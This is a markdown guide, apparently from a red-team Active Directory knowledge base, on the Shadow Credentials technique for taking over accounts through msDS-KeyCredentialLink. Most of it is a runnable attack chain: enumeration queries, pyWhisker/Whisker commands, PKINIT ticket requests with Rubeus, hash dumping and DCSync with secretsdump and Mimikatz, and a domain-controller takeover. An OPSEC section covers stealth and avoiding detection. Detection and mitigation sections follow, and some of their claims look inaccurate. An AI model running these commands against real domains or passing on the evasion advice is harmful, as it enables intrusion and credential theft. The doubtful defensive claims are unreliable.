# Shadow Credentials — Persistent Certificate-Based Authentication via msDS-KeyCredentialLink

## Overview

Shadow Credentials is a persistence and privilege escalation technique that exploits the `msDS-KeyCredentialLink` attribute in Active Directory. Any principal with **GenericWrite** or **GenericAll** permissions over a target object can add their own KeyCredential (a public key mapped to a certificate) to the target object. Once added, the attacker can authenticate as that target user via PKINIT (Kerberos certificate authentication).

This technique was introduced with Windows Server 2016 and Azure AD Join — domain-joined machines use this attribute to store KeyCredentials for WHfB (Windows Hello for Business). However, any AD object (users, computers) can have the attribute populated.

## How It Works

### KeyCredential Structure

The `msDS-KeyCredentialLink` attribute stores a set of `KeyCredential` objects. Each contains:

- **Raw public key** — RSA or ECDSA public key
- **Key ID** — Identifier for the credential
- **Creation time** — When the credential was added
- **Device/User identifier** — Who created the credential

### Authentication Flow

```
Attacker                              KDC (DC)                    Target Service
  │                                     │                            │
  │  Add KeyCredential to target        │                            │
  │  via GenericWrite                   │                            │
  │  (pyWhisker/Whisker)                │                            │
  │ ───────────────────────────────────>│                            │
  │                                     │                            │
  │  PKINIT AS-REQ                     │                            │
  │  ├─ Certificate                    │                            │
  │  └─ Domain Hint: domain.local      │                            │
  │ ───────────────────────────────────>│                            │
  │                                     │                            │
  │  KDC validates certificate         │                            │
  │  Maps to target user               │                            │
  │  Issues TGT                        │                            │
  │ <───────────────────────────────────│                            │
  │                                     │                            │
  │  Use TGT for service access         │                            │
  │ ───────────────────────────────────────────────────────────────>│
```

### Why It Works

1. The `msDS-KeyCredentialLink` attribute accepts new entries without special validation
2. Any user with `WriteProperty` on this attribute can add credentials
3. KDC validates the certificate during PKINIT and maps it to the AD object
4. A certificate with the proper Subject Alternative Name (SAN) authenticates as the target

### Key Permissions Required

| Right | Effect |
|-------|--------|
| GenericWrite | Write access to msDS-KeyCredentialLink |
| GenericAll | Full control, including msDS-KeyCredentialLink |
| WriteOwner | Can take ownership, then modify |
| WriteDacl | Can modify ACL, then add credential |

## Step-by-Step: Shadow Credentials Attack

### Step 1: Identify Targets with GenericWrite/GenericAll

#### BloodHound

```cypher
// Find all users with GenericWrite over other users
MATCH p = (n)-[r:GenericWrite|GenericAll]->(m)
WHERE n.name STARTS WITH "USER" AND m.name STARTS WITH "USER"
RETURN p

// Find computers with GenericWrite over users
MATCH p = (c:Computer)-[r:GenericWrite|GenericAll]->(u:User)
RETURN p

// Find most privilege escalation paths to Domain Admins
MATCH p = (n)-[r:GenericWrite|GenericAll|GenericMember]->(m)
WHERE m.name =~ "(?i).*DOMAIN ADMINS.*"
RETURN p
```

#### PowerView

```powershell
# Find objects where current user has GenericWrite
Get-DomainObjectAcl -ResolveGUIDs | Where-Object {
    ($_.ActiveDirectoryRights -match "GenericWrite" -or
     $_.ActiveDirectoryRights -match "GenericAll") -and
    $_.SecurityIdentifier -eq (Get-DomainUser).objectsid
} | ForEach-Object { ConvertFrom-SID $_.SecurityIdentifier }

# Find objects where a specific user has GenericWrite
Get-DomainObjectAcl -Identity target_user -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "GenericWrite|GenericAll"
}
```

### Step 2: Add KeyCredential with pyWhisker

```bash
# Basic add command
python3 pywhisker.py -d "domain.local" -u "controlled_user" -p "password123" \
    --target "target_user" --action "add" --filename "pwn.pfx"

# Using hashes instead of password
python3 pywhisker.py -d "domain.local" -u "controlled_user" -H "NTLM_HASH" \
    --target "target_user" --action "add" --filename "pwn.pfx"

# Using Kerberos auth
python3 pywhisker.py -d "domain.local" -u "controlled_user" -p "password123" \
    --target "target_user" --action "add" --filename "pwn.pfx" \
    --dc-ip 192.168.1.10 --use-kerberos

# List existing KeyCredentials on an object
python3 pywhisker.py -d "domain.local" -u "controlled_user" -p "password123" \
    --target "target_user" --action "list"

# Remove a KeyCredential
python3 pywhisker.py -d "domain.local" -u "controlled_user" -p "password123" \
    --target "target_user" --action "remove" --device-id "DEVICE_ID"
```

pyWhisker output example:
```
[*] Searching for the target account
[*] Target user found: CN=Target User,CN=Users,DC=domain,DC=local
[*] Generating certificate...
[*] Certificate generated:
[*] PFX saved to ==> pwn.pfx
[*] KeyCredential added to msDS-KeyCredentialLink successfully
[*] Next step: Run Rubeus or gettgtpkinit with PFX
[*]   Rubeus.exe asktgt /user:"target_user" /certificate:"BASE64" /password:"PASSWORD" /ptt
[*]   python3 gettgtpkinit.py domain.local/target_user -cert-pfx pwn.pfx -pfx-pass PASSWORD target.ccache
```

### Step 3: Add KeyCredential with Whisker (C#)

```cmd
# Add KeyCredential
Whisker.exe add /target:"target_user" /domain:"domain.local" /dc:"DC.domain.local" /path:"output.pfx" /password:"P@ssw0rd"

# List existing KeyCredentials
Whisker.exe list /target:"target_user" /domain:"domain.local" /dc:"DC.domain.local"

# Remove a KeyCredential by DeviceID
Whisker.exe remove /target:"target_user" /domain:"domain.local" /dc:"DC.domain.local" /deviceid:"DEVICE_ID"
```

### Step 4: Authenticate as the Target Using PKINIT

#### Using Rubeus (Windows)

```cmd
# First, convert the PFX to base64
certutil.exe -encode pwn.pfx pwn.b64
type pwn.b64

# Or use Rubeus directly with PFX
Rubeus.exe asktgt /user:"target_user" /certificate:pwn.pfx /password:"P@ssw0rd" /ptt

# Using base64-encoded certificate
Rubeus.exe asktgt /user:"target_user" /certificate:"BASE64_ENCODED_CERT" /password:"P@ssw0rd" /ptt

# With /nowrap for base64 output (useful for chaining)
Rubeus.exe asktgt /user:"target_user" /certificate:pwn.pfx /password:"P@ssw0rd" /nowrap

# Verify the TGT
klist
```

#### Using gettgtpkinit.py (Linux)

```bash
# Authenticate with PKINIT using the PFX
python3 gettgtpkinit.py "domain.local/target_user" -cert-pfx pwn.pfx -pfx-pass "P@ssw0rd" target.ccache

# Export the ticket
export KRB5CCNAME=target.ccache

# Verify access
python3 secretsdump.py -k -no-pass "domain.local/target_user@DC.domain.local"

# Or use the ticket for further attacks
python3 wmiexec.py -k -no-pass "domain.local/target_user@target.domain.local"
```

### Step 5: Get the NT Hash

Once authenticated as the target user, you can extract the NT hash:

```bash
# Using getnthash.py
python3 getnthash.py "domain.local/target_user" -key HASH

# Using secretsdump with the TGT
export KRB5CCNAME=target.ccache
python3 secretsdump.py -k -no-pass "domain.local/target_user@DC.domain.local" -just-dc-user target_user

# Or with DCSync (if target is a privileged account)
python3 secretsdump.py -k -no-pass "domain.local/target_user@DC.domain.local" -just-dc-ntlm
```

```cmd
# On Windows with Mimikatz (after asktgt /ptt)
privilege::debug
lsadump::dcsync /user:target_user
```

## Advanced: Shadow Credentials on Machine Accounts

Targeting machine accounts grants access as the computer itself:

```bash
# Target a domain controller's machine account
python3 pywhisker.py -d "domain.local" -u "controlled_user" -p "password123" \
    --target "DC$" --action "add" --filename "dc.pfx"

# Authenticate as the DC
python3 gettgtpkinit.py "domain.local/DC$" -cert-pfx dc.pfx -pfx-pass "P@ssw0rd" dc.ccache

# DCSync (since DC$ has replication rights)
export KRB5CCNAME=dc.ccache
python3 secretsdump.py -k -no-pass "domain.local/DC$@DC.domain.local"
```

## BloodHound Detection of Shadow Credentials

BloodHound can identify objects with Shadow Credentials and the paths to abuse them:

```cypher
// Find all objects with msDS-KeyCredentialLink set
MATCH (n) WHERE n.isfragile = true RETURN n

// Check for Shadow Credentials on high-value objects
MATCH (n {highvalue:true}) WHERE n.isfragile = true RETURN n

// Find attack paths using Shadow Credentials
MATCH p = (n)-[r:GenericWrite|GenericAll|WriteOwner|WriteDacl]->(m {highvalue:true})
RETURN p
```

Custom BloodHound queries for Shadow Credentials:

```cypher
// Find users who have control over other users (potential Shadow Credentials)
MATCH p = (src:User)-[r:GenericWrite|GenericAll]->(tgt:User)
WHERE NOT src = tgt
RETURN p

// Find computers that can be controlled for computer object Shadow Credentials
MATCH (src:User)-[r:GenericWrite|GenericAll]->(tgt:Computer {highvalue: true})
RETURN src.name, r.name, tgt.name
```

## Persistence Value

Shadow Credentials offer unique persistence advantages:

| Property | Value |
|----------|-------|
| Survives password changes | SHA512(KeyCredential) remains valid |
| No password required for auth | Certificate-based PKINIT auth |
| Stealthy | Small attribute modification |
| Remote | Can be added without execution on target |
| Scalable | Can add to multiple targets |
| Reversible | Can be removed after use |

### Why It Survives Password Changes

The KeyCredential is linked to the user object but is **independent** of the user's password hash. When the password changes:
- NTLM hash changes (old hashes invalid)
- Kerberos keys change (old keys invalid)
- **KeyCredential remains valid** — PKINIT only validates the certificate chain

## OPSEC Considerations

### Stealth

- Modify the `msDS-KeyCredentialLink` attribute during off-hours
- Use realistic certificate subjects
- Remove the credential after use (cleanup)
- Consider targeting lower-privilege accounts first, then lateral movement

### Cleanup

```bash
# List added credentials
python3 pywhisker.py -d "domain.local" -u "controlled_user" -p "password123" \
    --target "target_user" --action "list"

# Remove the credential
python3 pywhisker.py -d "domain.local" -u "controlled_user" -p "password123" \
    --target "target_user" --action "remove" --device-id "DEVICE_ID"
```

```cmd
Whisker.exe remove /target:"target_user" /domain:"domain.local" /dc:"DC.domain.local" /deviceid:"DEVICE_ID"
```

### Avoiding Detection

- Use the same user for adding and removing credentials
- Don't leave multiple credentials on sensitive accounts
- Time-bound credential usage (add, use, remove within engagement window)
- Avoid adding Shadow Credentials to Tier 0 accounts if lower-tier access suffices

## Detection

### Event ID 5136 — Directory Service Object Modification

The primary detection event for Shadow Credentials:

```
A directory service object was modified.
  Object: CN=Target User,CN=Users,DC=domain,DC=local
  Attribute: msDS-KeyCredentialLink
  Operation: Add
  Old Value: (none)
  New Value: <binary data>
```

Key detection points:
- Monitor **all** modifications to `msDS-KeyCredentialLink`
- Alert on modifications to high-value accounts (Domain Admins, EA, etc.)
- Track who modified the attribute vs the target user
- Watch for modifications from non-WHfB-compatible clients (Linux tools)

### Event ID 4768 — Kerberos TGT Request (PKINIT)

When using the Shadow Credential for authentication:

```
A Kerberos authentication ticket (TGT) was requested.
  Account Name: target_user
  Account Domain: domain.local
  Transited Services: -
  Service Name: krbtgt
  Ticket Options: 0x40810010
  Ticket Encryption Type: 0x19 (PKINIT)
  Pre-Authentication Type: 16 (PKINIT)
```

### PowerShell Detection

```powershell
# Check for users with msDS-KeyCredentialLink set (non-zero)
Get-ADUser -Filter "msDS-KeyCredentialLink -like '*'" -Properties msDS-KeyCredentialLink, name | Select name, msDS-KeyCredentialLink

# Check for computers with msDS-KeyCredentialLink
Get-ADComputer -Filter "msDS-KeyCredentialLink -like '*'" -Properties msDS-KeyCredentialLink, name | Select name, msDS-KeyCredentialLink

# Audit log query for msDS-KeyCredentialLink modifications
Get-WinEvent -FilterHashtable @{LogName="Security"; ID=5136} |
    Where-Object { $_.Properties[1].Value -match "msDS-KeyCredentialLink" }
```

### LDAP Query

```powershell
# Search for all objects with KeyCredentials
Get-ADObject -LDAPFilter "(msDS-KeyCredentialLink=*)" -Properties msDS-KeyCredentialLink
```

## Mitigations

| Mitigation | Description | Impact |
|------------|-------------|--------|
| Strong Certificate Binding | Enable EPA for PKINIT authentication | Reduces relay risk |
| Monitor Sensitive Accounts | Alert on msDS-KeyCredentialLink changes | Detection |
| Remove Excessive Permissions | Audit GenericWrite/GenericAll grants | Prevention |
| Protected Users Group | Add high-value accounts | Blocks PKINIT for those accounts |
| Enable Audit Policy | Audit directory service access | Detection |

### Strong Certificate Binding

```powershell
# Enforce strong certificate mapping via group policy
# Computer Configuration > Administrative Templates > System > Kerberos
# "Strong certificate binding for Kerberos" = Enabled
# "KDC certificate verification" = Enabled
```

### Removing Excessive Permissions

```powershell
# Audit who has GenericWrite on sensitive accounts
Get-DomainObjectAcl -Identity "CN=Admins,CN=Users,DC=domain,DC=local" -ResolveGUIDs |
    Where-Object { $_.ActiveDirectoryRights -match "GenericWrite|GenericAll" }

# Remove excessive permissions
Remove-DomainObjectAcl -TargetIdentity "target_user" -PrincipalIdentity "abusive_user" -Rights GenericWrite
```

### Protected Users Group

```powershell
# Add high-value accounts to Protected Users group
Add-ADGroupMember -Identity "Protected Users" -Members target_user
```

## Cross-References

- [ADCS Attacks Overview](../07_ADCS_Attacks/01_Certipy_Enumeration.md)
- [Certificate Persistence](../08_Persistence/08_Certificate_Persistence.md)
- [ESC8 - NTLM Relay to AD CS](../07_ADCS_Attacks/04_ESC7_ESC8.md)
- [Tools Reference - pyWhisker](../09_Tools_Reference/README.md)
- [Tools Reference - Rubeus](../09_Tools_Reference/README.md)
- [Tools Reference - Impacket](../09_Tools_Reference/README.md)
